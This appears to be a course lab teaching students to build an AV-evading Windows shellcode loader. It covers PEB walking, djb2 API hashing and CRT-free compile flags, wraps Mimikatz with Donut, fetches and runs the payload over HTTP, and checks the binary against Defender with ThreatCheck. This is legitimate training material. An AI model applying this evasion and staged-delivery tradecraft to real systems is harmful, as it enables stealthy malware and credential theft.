# Lab: Build Your Own Shellcode Loader

## Overview

In this take-home lab you will build a working Windows x64 shellcode loader from scratch in C, understand every design decision behind it, wrap a payload with Donut, and deliver it via both a local file and an HTTP server. By the end you will have a loader that passes ThreatCheck static analysis and a concrete mental model of how loaders, PEB walking, and API hashing work.

This lab is intentionally open-ended. You are encouraged to use the reference implementation as a guide, not a crutch — read the code, understand it, then write your own version.

> 🎁 **Your loader, your tool.** The `loader.c` reference implementation in `C:\Lab-Artifacts\loader\` is the same loader everyone in this course used during the live lab sessions. It is yours to keep. That said, treat it as a **baseline** — a starting point that demonstrates the core concepts cleanly, not a finished offensive tool. What it does not have is at least as interesting as what it does: no encryption, no sandbox evasion, no AMSI bypass, no syscalls, no process injection. The extension challenges in Part 6 hint at where to take it next, and the courses in the resources section will take you further still.

---

## Prerequisites

| Requirement | Details |
|---|---|
| OS | Windows 10/11 x64 (isolated VM) |
| Compiler | Visual Studio 2022 — install the **"Desktop development with C++"** workload |
| Tools | ThreatCheck, Donut, Python 3 (for payload serving and hash verification) |
| Knowledge | Basic C, familiarity with the Windows API, hex/binary fundamentals |

> ⚠️ **Warning:** Perform all work inside an isolated VM on a host-only network. Do not run payloads on production or domain-joined systems.

---

## Lab Goals

- Understand how shellcode loaders resolve Windows APIs without a static import table
- Implement PEB walking and export table parsing by hand
- Wrap a PE payload with Donut and execute it via your loader
- Serve a payload over HTTP and load it remotely
- Verify your loader passes ThreatCheck static analysis

---

## Background Reading

Before writing any code, read through the following. Budget 30–60 minutes here — time spent understanding the concepts pays off when you are debugging.

### The Import Address Table (IAT) problem

Every standard Windows executable has an IAT — a table of function pointers that the OS loader fills in at load time. AV engines and EDRs use the IAT as a detection signal: a binary that imports `VirtualAlloc`, `CreateThread`, and `WriteProcessMemory` in one place is immediately suspicious.

A shellcode loader avoids this by **resolving all APIs at runtime** using two techniques:

1. **PEB walking** — finding a loaded DLL's base address without calling `GetModuleHandle`
2. **Export table parsing** — finding a function's address without calling `GetProcAddress`

Neither technique leaves a static IAT entry.

### The Process Environment Block (PEB)

The PEB is a per-process structure maintained by the OS. On x64, a pointer to it lives at `GS:0x60`. It contains `PEB_LDR_DATA`, which holds three doubly-linked lists of every module loaded into the process. Walking `InMemoryOrderModuleList` lets you enumerate all loaded DLLs and find their base addresses by name — no API call required.

Key offsets (x64):

```
GS:0x60           → PEB base
PEB  + 0x18       → PEB_LDR_DATA pointer
LDR  + 0x20       → InMemoryOrderModuleList head (LIST_ENTRY)
Entry + 0x48      → UNICODE_STRING.Length (module filename, bytes)
Entry + 0x50      → UNICODE_STRING.Buffer (module filename, wide chars)
Entry + 0x20      → DllBase (the base address you want)
```

### Export Table Parsing

Once you have a DLL's base address, you can find any exported function by parsing its PE export directory manually. The export directory lives at a fixed offset in the PE optional header and contains three parallel arrays:

```
AddressOfNames      → array of RVAs to function name strings
AddressOfNameOrdinals → array of ordinals (indexes into AddressOfFunctions)
AddressOfFunctions  → array of RVAs to function code
```

To find a function: iterate `AddressOfNames`, hash each name, compare to your target hash. On match, use the corresponding ordinal to index into `AddressOfFunctions`.

### djb2 Hashing

Rather than storing plaintext API names (detectable strings), the loader stores pre-computed djb2 hashes. djb2 is simple and fast:

```python
def djb2(s, wide=False):
    h = 5381
    if wide:
        s = s.lower()
        for c in s:
            h = ((h << 5) + h) ^ ord(c)
            h &= 0xFFFFFFFF
    else:
        for c in s:
            h = ((h << 5) + h) ^ ord(c)
            h &= 0xFFFFFFFF
    return h
```

Module names are hashed wide (UTF-16LE, lowercased). Export names are hashed as ASCII (exact case).

### Further Reading

- [Windows Internals, Part 1 — Chapter 3: Processes](https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals) — PEB and loader structures
- [PE Format reference (Microsoft)](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format) — export directory layout
- [Sektor7 Malware Development Essentials](https://institute.sektor7.net/) — structured course on loader tradecraft
- [Maldev Academy](https://maldevacademy.com/) — hands-on malware development curriculum
- [VX-Underground Papers](https://vx-underground.org/) — primary source research on shellcode techniques

---

## Part 1: Understand the Reference Implementation

A reference implementation (`loader.c`) and its documentation (`loader-docs.md`) are provided in `C:\Lab-Artifacts\loader\`. **Read both files completely before writing any code.**

Work through the following questions. Write your answers down — you will need this understanding in Part 2.

### Step 1 - PEB Walking

1. On x64 Windows, what register and offset give you a pointer to the PEB?
2. What field inside `PEB_LDR_DATA` does the loader walk, and what does each entry represent?
3. Why are module names compared case-insensitively? What would break if you compared them as-is?
4. The loader hashes each module name as wide characters but only XORs with `(unsigned char)c`. Why cast to `unsigned char`?

### Step 2 - Export Resolution

5. What is an RVA (Relative Virtual Address)? How do you convert one to an absolute address?
6. Why does `findExp` need the DLL base address as a parameter?
7. The three export arrays (`AddressOfNames`, `AddressOfNameOrdinals`, `AddressOfFunctions`) are parallel but not the same length. Why? What does the ordinal value represent?
8. Export hashes are case-sensitive but module hashes are case-insensitive. Why the difference?

### Step 3 - Execution Flow

9. Why does the loader call `VirtualAlloc` with `PAGE_READWRITE` first and then `VirtualProtect` to add execute permission, rather than allocating with `PAGE_EXECUTE_READWRITE` directly?
10. Why does the loader use `CreateThread` + `WaitForSingleObject` rather than calling the shellcode directly as a function pointer?
11. What happens if you use `PAGE_EXECUTE_READ` with a Donut payload? Why?
12. `wininet.dll` is loaded via `LoadLibraryA` at runtime rather than being listed in the PE's imports. What evasion benefit does this provide?

### Step 4 - Verify the Hash Constants

Run the following Python snippet and verify the output matches the constants in `loader.c`:

```python
def djb2(s, wide=False):
    h = 5381
    if wide:
        s = s.lower()
        for c in s:
            h = ((h << 5) + h) ^ ord(c)
            h &= 0xFFFFFFFF
    else:
        for c in s:
            h = ((h << 5) + h) ^ ord(c)
            h &= 0xFFFFFFFF
    return h

apis = [
    "VirtualAlloc", "CreateThread", "WaitForSingleObject",
    "VirtualFree", "CloseHandle", "ExitProcess", "VirtualProtect",
    "GetCommandLineA", "CreateFileA", "GetFileSize", "ReadFile",
    "LoadLibraryA", "InternetOpenA", "InternetOpenUrlA",
    "InternetReadFile", "InternetCloseHandle", "HttpQueryInfoA"
]

for name in apis:
    print(f"{name}: 0x{djb2(name):08X}")

print(f"kernel32.dll: 0x{djb2('kernel32.dll', wide=True):08X}")
```

**Expected behaviour:** Every printed hash matches a `#define` constant in `loader.c`.

> 📝 **Note:** If any value differs, the mismatch points to an encoding assumption — check whether the relevant API name is hashed wide or ASCII, and whether the case lowering applies.

---

## Part 2: Write Your Own Loader

Now write your own loader from scratch. Do not copy-paste the reference — use it as a reference when you are stuck, but type your own implementation. This is where the learning happens.

### Step 1 - Plan Your Requirements

Your loader must:

- Resolve all APIs via PEB walking and export table parsing (no static imports except what the linker requires for entry)
- Accept a file path or HTTP URL as a command-line argument
- Allocate memory with `VirtualAlloc`, change protection with `VirtualProtect`, and execute on a new thread
- Compile without the CRT

Start simple. Get file-path loading working before adding HTTP support.

### Step 2 - Compile Your Loader

Open an x64 Developer Command Prompt (search "Developer Command Prompt for VS 2022"):

```cmd
cl.exe /GS- /EHs-c- /O1 /Zl loader.c /link /NODEFAULTLIB /ENTRY:main /FIXED /SUBSYSTEM:CONSOLE kernel32.lib
```

**Flags:**

| Flag | Purpose |
|---|---|
| `/GS-` | Disable stack cookie — requires CRT security check which you are not linking |
| `/EHs-c-` | Disable C++ exception handling |
| `/O1` | Optimize for size |
| `/Zl` | Omit default library name from the object file |
| `/NODEFAULTLIB` | No CRT linkage |
| `/ENTRY:main` | Use `main` as the entry point directly |
| `/FIXED` | No relocations — reduces binary size |
| `/SUBSYSTEM:CONSOLE` | Console subsystem |

**Expected output:**
```
Microsoft (R) C/C++ Optimizing Compiler Version ...
loader.c
Microsoft (R) Incremental Linker Version ...
```

No errors should appear. Warnings about unresolved symbols indicate a missing flag or an inadvertent CRT dependency.

### Step 3 - Using AI Effectively

AI tools (Claude, ChatGPT, Copilot) are useful here — but use them to **understand**, not to generate. Suggested prompts:

- *"Explain what `__readgsqword(0x60)` does on x64 Windows and why this gives us the PEB"*
- *"Walk me through how the PE export directory works — what are AddressOfNames, AddressOfNameOrdinals, and AddressOfFunctions and how do they relate to each other?"*
- *"I'm getting an access violation when I cast my memory allocation to a function pointer and call it. What are the common causes?"*
- *"Why would `WaitForSingleObject` return immediately instead of blocking?"*
- *"What does it mean for a binary to have no IAT entries, and how does the linker handle `/NODEFAULTLIB /ENTRY:main`?"*

Use AI to explain concepts and debug specific errors — do not ask it to write the loader for you. The goal is your understanding, not a working binary you don't own.

---

## Part 3: Generate a Payload with Donut

Donut converts a PE (exe or DLL) into position-independent shellcode that your loader can execute.

### Step 1 - Install Donut

```cmd
pip install donut-shellcode
```

Or grab a pre-built binary from the [Donut GitHub releases](https://github.com/TheWover/donut/releases).

Confirm it is available:

```cmd
donut --help
```

**Expected output:**
```
  [ Donut shellcode generator v1
  [ Copyright (c) 2019-2021 TheWover, Odzhan

 usage: donut [options] <EXE/DLL/VBS/JS>
```

### Step 2 - Generate a Test Payload

For this lab, use a benign PE first — confirm your loader works before introducing anything that Defender might flag. A good choice is a simple "Hello World" console executable you compile yourself.

Once your loader is working with a benign payload, generate a Mimikatz shellcode payload:

```cmd
donut -i mimikatz.exe -a 2 -b 1 -p "a \"coffee\" \"exit\"" -o coffee.bin
```

| Flag | Value | Meaning |
|---|---|---|
| `-i` | `mimikatz.exe` | Input PE |
| `-a 2` | x64 | Target architecture |
| `-b 1` | Skip | Skip AMSI/WLDP/ETW bypass (Donut's built-in bypass — leave as-is for now) |
| `-p` | command string | Fake `argv` injected into the PE at runtime |
| `-o` | `coffee.bin` | Output shellcode blob |

**Expected output:**
```
  [ Instance type : Embedded
  [ Module file   : "mimikatz.exe"
  [ Entropy       : Random names + Encryption
  [ File type     : EXE
  [ Parameters    : a "coffee" "exit"
  [ Target CPU    : amd64
  [ AMSI/WDLP/ETW : none
  [ Shellcode     : "coffee.bin"
  [ Exit          : Thread
```

> 📝 **Note:** Donut patches `GetCommandLineA` in the PE's IAT to return your `-p` string verbatim. The Windows CRT startup code parses this string the same way a shell does — the first token becomes `argv[0]` (the program name). Mimikatz discards `argv[0]` with `argc--, argv++`, so without a dummy first token your first real command is silently thrown away. The dummy value can be anything — `a`, `x`, `loader.exe`. Avoid using `mimikatz.exe` as the dummy since that string ends up in the shellcode blob and is a detectable artifact.

### Step 3 - Execute via File Path

```cmd
loader.exe C:\Lab-Artifacts\payloads\coffee.bin
```

**Expected behaviour:** Mimikatz's coffee ASCII art is printed to the console and the process exits cleanly.

---

## Part 4: Serve the Payload over HTTP

Your loader can also fetch a payload from an HTTP URL. This simulates a staged delivery model where the shellcode is not stored on disk.

### Step 1 - Start a Python HTTP Server

On your VM (or a second VM on the same host-only network):

```cmd
cd C:\Lab-Artifacts\payloads
python -m http.server 8888
```

**Expected output:**
```
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

Leave this terminal open — it will log the download request from the loader.

### Step 2 - Execute via URL

```cmd
loader.exe http://127.0.0.1:8888/coffee.bin
```

**Expected behaviour:**
- The Python server logs a `200 GET /coffee.bin` request.
- Mimikatz coffee ASCII art appears in the loader console window.

**Things to observe:**
- Does the loader correctly detect the URL vs. file path branch?
- What happens if the HTTP server is not running when you try to load?
- What happens if the Content-Length header is missing? Does your loader fall back gracefully?

---

## Part 5: Verify with ThreatCheck

### Step 1 - Run ThreatCheck

```cmd
C:\Lab-Artifacts\ThreatCheck\ThreatCheck.exe -f loader.exe -e Defender
```

**Expected output:**
```
[+] No threat found!
```

### Step 2 - Diagnose a Signature Hit

If ThreatCheck reports a hit, identify the offset, find the flagged bytes in your binary, and determine which string or pattern in your source produced them.

ThreatCheck will print output similar to:

```
[!] Identified end of bad bytes at offset 0x3B200
[*] Dumping 256 bytes from offset 0x3B100

  Offset    00 01 02 03 04 05 06 07  ANSI
  --------  -----------------------  ----
  0x3B100   56 69 72 74 75 61 6C 41  VirtualA
  0x3B108   6C 6C 6F 63 00 43 72 65  lloc.Cre
  ...
```

Common causes:

- Plaintext API name strings left in the binary — use hashes instead
- URL or path strings compiled in as constants
- Debug symbols or default library metadata — check your compile flags

> 📝 **Note:** Go back to the ThreatCheck lab workflow for the full iteration process: identify the offset, trace the bytes back to source, patch, recompile, and re-run.

---

## Part 6: Extension Challenges

These are optional but recommended if you want to go deeper.

### Challenge 1 — XOR Encryption

The shellcode blob sitting in memory as plaintext is a detectable artifact. Add XOR encryption: encrypt your payload before writing it to disk and decrypt it in-memory after `VirtualAlloc` but before `VirtualProtect`. Use a single-byte or multi-byte key.

### Challenge 2 — Indirect Syscalls

`VirtualAlloc` and `CreateThread` are heavily monitored by EDRs via user-mode hooks. Research how **direct syscalls** or **indirect syscalls** work and replace at least one hooked API call in your loader with a syscall stub.

Resources to start with:
- [SysWhispers3](https://github.com/klezVirus/SysWhispers3)
- [Sektor7 — Intermediate Malware Development](https://institute.sektor7.net/)

### Challenge 3 — Add Your Own API

Extend the loader to support HTTPS. What changes are needed in the `wininet.dll` flow? What additional APIs do you need to resolve? What flags change on `InternetOpenUrlA`?

### Challenge 4 — Reflective Loading

Rather than executing raw shellcode, research **reflective DLL injection** — loading a PE from memory without calling `LoadLibrary`. Start with [Stephen Fewer's original ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection) and understand how a PE maps itself.

---

## Recommended Resources

### Courses

| Resource | Focus |
|---|---|
| [Sektor7 — Malware Development Essentials](https://institute.sektor7.net/) | Loader fundamentals, process injection, evasion |
| [Sektor7 — Intermediate Malware Development](https://institute.sektor7.net/) | Syscalls, EDR evasion, advanced techniques |
| [Maldev Academy](https://maldevacademy.com/) | Comprehensive malware development curriculum |
| [TCM Security — Malware Analysis](https://tcm-sec.com/) | Analysis side — understand what you are building against |

### References

| Resource | Why It Matters |
|---|---|
| [Microsoft PE Format](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format) | Authoritative PE structure reference |
| [Windows Internals (Yosifovich et al.)](https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals) | PEB, LDR, process internals |
| [VX-Underground](https://vx-underground.org/) | Primary source papers on shellcode techniques |
| [donut GitHub](https://github.com/TheWover/donut) | Donut source and documentation |
| [rasta-mouse/ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) | ThreatCheck source |

### Using AI as a Learning Tool

| Good use | Avoid |
|---|---|
| "Explain what this assembly instruction does" | "Write me a shellcode loader" |
| "Why does VirtualProtect need the old protection value?" | "Generate the PEB walking code for me" |
| "I'm getting error 0xC0000005 on this line — what does that mean?" | "Complete my loader.c" |
| "What is the difference between PAGE_EXECUTE_READ and PAGE_EXECUTE_READWRITE?" | Pasting the whole lab and asking for answers |
| "Explain the PE export directory format with an example" | — |

The goal is to be able to explain every line of your loader to someone else. If you cannot do that, you have not learned it yet.

---

## What a Successful Lab Looks Like

| Check | Expected Result |
|---|---|
| Question Sets A–D answered | All hash values match `loader.c` constants; all conceptual questions answered in your own words |
| `loader.c` written from scratch | No copy-paste from reference; you can explain every line |
| Binary compiles clean | No errors with the `/GS- /EHs-c- /O1 /Zl /NODEFAULTLIB /ENTRY:main /FIXED` flags |
| `loader.exe` passes ThreatCheck | `[+] No threat found!` |
| File-path execution | Mimikatz coffee ASCII art printed to the console |
| HTTP execution | Mimikatz coffee ASCII art printed; Python server logs `200 GET /coffee.bin` |
| ThreatCheck hits diagnosed | Each flagged offset traced back to source and resolved |

---

---

## Common Errors and Fixes

| Error | Cause | Fix |
|---|---|---|
| `error C2065: undeclared identifier` | Missing `#include` or struct typedef | Confirm definitions for `PEB`, `PEB_LDR_DATA`, and `LDR_DATA_TABLE_ENTRY` are present |
| `unresolved external symbol __security_cookie` | Stack cookie check compiled in | Add `/GS-` to your compile flags |
| `unresolved external symbol __CxxFrameHandler3` | C++ exception support compiled in | Add `/EHs-c-` |
| Binary compiles but crashes on launch | PEB walk offset wrong or null-pointer dereference in export parsing | Run under WinDbg; break on first-chance exception; inspect `GS:0x60` and the LDR chain |
| Loader hangs with no output | Thread never exits — `WaitForSingleObject` blocks indefinitely | Confirm the shellcode was generated with an `exit` command; check the thread handle is valid before waiting |
| ThreatCheck flags the binary | Plaintext API name strings compiled into the binary | Replace all literal API name strings with their pre-computed hash constants |
| `VirtualAlloc` returns NULL | Allocation size is zero or address space is exhausted | Confirm the payload size is read correctly before allocation |
| HTTP payload does not execute | `VirtualProtect` call missing or failed | Confirm protection is changed to `PAGE_EXECUTE_READ` (or `PAGE_EXECUTE_READWRITE` for Donut) before `CreateThread` |
| Donut payload crashes with `PAGE_EXECUTE_READ` | Donut's bootstrap requires write access for self-modification | Use `PAGE_EXECUTE_READWRITE` for Donut-generated shellcode |
| Python server returns `404` | Server started from wrong directory | Confirm `python -m http.server 8888` is run from the directory containing the `.bin` file |
